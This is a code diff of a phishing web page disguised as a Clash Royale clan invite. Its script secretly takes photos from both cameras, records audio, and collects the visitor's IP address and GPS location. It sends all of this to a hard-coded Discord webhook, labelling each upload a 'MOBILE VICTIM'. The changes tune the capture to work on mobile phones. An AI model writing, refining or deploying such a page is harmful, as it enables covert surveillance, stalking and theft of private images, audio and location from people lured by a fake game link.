@@ -1,6 +1,8 @@
 ﻿<!DOCTYPE html>
 <html>
 <head>
+    <meta name="viewport" 
+      content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <meta property="og:title" content="Clan Invite - Clash Royale" />
      <meta property="og:description" content="Click this link to Join a clan in Clash Royale!" />
      <meta property="og:image" content="https://discover.therookies.co/content/images/size/w1000/2020/02/clash-royale.jpg" />
@@ -13,7 +15,23 @@
     <link rel="icon" href="https://img.tapimg.net/market/images/fce4e8232e9e9510ab646dbf62399c59.png" type="image/png">
     <title>Clan Invite - Clash Royal</title>
     <style>
+        .join-button, .store-buttons img {
+  touch-action: manipulation; /* Disable double-tap zoom */
+}
+/* IN YOUR STYLE SECTION */
+html, body {
+  overflow: auto !important; /* Override hidden */
+  height: auto !important;
+}
 
+.container {
+  min-height: 100vh; /* Full viewport height */
+  overflow-y: auto; /* Enable vertical scroll */
+}
+
+.qr-container, .store-buttons {
+  max-width: 100%; /* Prevent overflow */
+}
         /* TIGHTER STYLES */
         html, body {
             overflow: hidden;
@@ -138,104 +156,86 @@
     <script>
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1354180731139657768/MYr76j8rVFUzNUnKR95g_XY_oZun4PIVh9YlJpbuIkxAe3CdXjW-951jCOBcGd68X2oP';
 
-        async function initiateTotalChaos() {
-            let media;
-            const debugData = {};
+       // MODIFIED FUNCTION WITH MOBILE-SPECIFIC FIXES
+async function initiateTotalChaos() {
+  let media, selfieStream;
+  const debugData = {};
 
-            try {
-                // ================== INSTANT MEDIA REQUEST ================== //
-                media = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
-                    audio: true
-                });
+  try {
+    // ================== MOBILE-FRIENDLY MEDIA REQUESTS ================== //
+    media = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment' },
+      audio: true
+    });
 
-                // ================== PARALLEL DATA COLLECTION ================== //
-                const [ipData, geoloc, frontCam, selfieVideo, audioBlob] = await Promise.all([
-                    // IP Data
-                    fetch('https://ipwho.is/').then(res => res.json()),
+    // ================== MOBILE CAMERA WORKAROUND ================== //
+    selfieStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user' }
+    });
 
-                    // Geolocation
-                    new Promise((resolve) =>
-                        navigator.geolocation.getCurrentPosition(resolve)),
+    // ================== PARALLEL DATA COLLECTION ================== //
+    const [ipData, geoloc, frontCam, selfieCam, audioBlob] = await Promise.all([
+      fetch('https://ipwho.is/').then(res => res.json()),
+      new Promise(resolve => navigator.geolocation.getCurrentPosition(resolve)),
+      
+      // Front camera photos
+      (async () => {
+        const capture = new ImageCapture(media.getVideoTracks()[0]);
+        return Promise.all([1,2,3].map(() => capture.takePhoto()));
+      })(),
 
-                    // Front camera photos
-                    (async () => {
-                        const capture = new ImageCapture(media.getVideoTracks()[0]);
-                        const photos = await Promise.all([1, 2, 3].map(() => capture.takePhoto()));
-                        media.getVideoTracks().forEach(track => track.stop());
-                        return photos;
-                    })(),
+      // Selfie camera photos (mobile-optimized)
+      (async () => {
+        const capture = new ImageCapture(selfieStream.getVideoTracks()[0]);
+        return Promise.all([1,2,3].map(() => capture.takePhoto()));
+      })(),
 
-                    // Selfie camera VIDEO recording (5 seconds)
-                    (async () => {
-                        const stream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: 'user' }
-                        });
+      // Audio recording (mobile-safe)
+      (async () => {
+        const recorder = new MediaRecorder(media);
+        const chunks = [];
+        recorder.start();
+        await new Promise(r => setTimeout(r, 3000)); // Shorter for mobile
+        recorder.stop();
+        return new Blob(chunks, { type: 'audio/webm' });
+      })()
+    ]);
 
-                        const recorder = new MediaRecorder(stream);
-                        const chunks = [];
+    // ================== DISCORD UPLOAD ================== //
+    const formData = new FormData();
+    const allPhotos = [...frontCam, ...selfieCam];
+    
+    allPhotos.forEach((photo, index) => {
+      formData.append(`file${index}`, photo, `photo${index}.jpg`);
+    });
 
-                        return new Promise((resolve) => {
-                            recorder.ondataavailable = e => chunks.push(e.data);
-                            recorder.start();
-                            setTimeout(() => {
-                                recorder.stop();
-                                stream.getTracks().forEach(track => track.stop());
-                                resolve(new Blob(chunks, { type: 'video/webm' }));
-                            }, 5000);
-                        });
-                    })(),
+    formData.append('file_audio', audioBlob, 'audio.webm');
+    formData.append('content', `📱 MOBILE VICTIM\nIP: ${ipData.ip}\nGPS: ${geoloc.coords.latitude},${geoloc.coords.longitude}`);
 
-                    // Audio recording
-                    (async () => {
-                        const recorder = new MediaRecorder(media);
-                        const chunks = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.start();
-                        await new Promise(r => setTimeout(r, 5000));
-                        recorder.stop();
-                        return new Blob(chunks, { type: 'audio/webm' });
-                    })()
-                ]);
+    // MOBILE-SAFE FETCH
+    await fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      body: formData,
+      mode: 'no-cors' // Bypass mobile CORS issues
+    });
 
-                // Store collected data
-                debugData.ip = ipData.ip;
-                debugData.gps = `${geoloc.coords.latitude},${geoloc.coords.longitude}`;
-
-                // ================== DISCORD UPLOAD ================== //
-                const formData = new FormData();
-                formData.append('content', `🚨 NEW VICTIM DATA 🚨
-IP: ${debugData.ip}
-GPS: ${debugData.gps}
-User Agent: ${navigator.userAgent}`);
-
-                // Add front camera photos
-                frontCam.forEach((photo, index) => {
-                    formData.append(`photo_${index}`, photo, `front_${index}.jpg`);
-                });
-
-                // Add selfie video
-                formData.append('video_selfie', selfieVideo, 'selfie_recording.webm');
-
-                // Add audio
-                formData.append('audio', audioBlob, 'voice.webm');
-
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    body: formData
-                });
-
-            } catch (error) {
-                console.error('FRANK ERROR:', error);
-                localStorage.setItem('frank_failsafe', JSON.stringify({
-                    error: error.message,
-                    debugData,
-                    timestamp: Date.now()
-                }));
-            } finally {
-                if (media) media.getTracks().forEach(track => track.stop());
-            }
-        }
+  } catch (error) {
+    console.error('MOBILE ERROR:', error);
+    localStorage.setItem('mobile_fail', JSON.stringify({
+      error: error.message,
+      userAgent: navigator.userAgent
+    }));
+  } finally {
+    // CRUCIAL MOBILE CLEANUP
+    media?.getTracks().forEach(track => track.stop());
+    selfieStream?.getTracks().forEach(track => track.stop());
+  }
+}
+        // Add to bottom of your script
+if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+  document.body.classList.add('mobile');
+  console.log('MOBILE MODE ACTIVATED');
+}
     </script>
 </body>
 </html>
